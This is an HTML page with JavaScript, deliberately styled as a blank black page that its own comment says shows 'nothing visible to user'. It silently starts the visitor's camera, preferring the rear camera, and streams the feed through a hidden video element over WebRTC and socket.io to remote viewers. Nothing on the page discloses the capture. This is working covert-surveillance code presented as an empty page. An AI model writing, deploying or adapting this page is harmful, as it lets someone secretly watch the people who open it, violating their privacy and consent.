<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>.</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { background:#000; }
  </style>
</head>
<body>

<!-- Completely blank page â€” nothing visible to user -->
<video id="video" autoplay playsinline muted style="display:none"></video>

<script src="/socket.io/socket.io.js"></script>
<script>
  const socket = io();
  let localStream = null;
  let peerConnections = {};

  const iceConfig = {
    iceServers: [
      { urls: 'stun:stun.l.google.com:19302' },
      { urls: 'stun:stun1.l.google.com:19302' }
    ]
  };

  async function startCamera() {
    try {
      try {
        localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
      } catch {
        localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
      }
      document.getElementById('video').srcObject = localStream;
      socket.emit('streamer-ready');
    } catch (err) {
      console.error('Camera error:', err.message);
    }
  }

  socket.on('new-viewer', async ({ viewerId }) => {
    const pc = new RTCPeerConnection(iceConfig);
    peerConnections[viewerId] = pc;

    localStream.getTracks().forEach(track => pc.addTrack(track, localStream));

    pc.onicecandidate = (e) => {
      if (e.candidate) socket.emit('ice-candidate', { candidate: e.candidate, to: viewerId });
    };

    pc.addEventListener('connectionstatechange', () => {
      if (pc.connectionState === 'disconnected' || pc.connectionState === 'failed') {
        delete peerConnections[viewerId];
      }
    });

    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
    socket.emit('offer', { sdp: pc.localDescription, to: viewerId });
  });

  socket.on('answer', async ({ sdp, from }) => {
    const pc = peerConnections[from];
    if (pc) await pc.setRemoteDescription(new RTCSessionDescription(sdp));
  });

  socket.on('ice-candidate', async ({ candidate, from }) => {
    const pc = peerConnections[from];
    if (pc && candidate) await pc.addIceCandidate(new RTCIceCandidate(candidate));
  });

  startCamera();
</script>
</body>
</html>
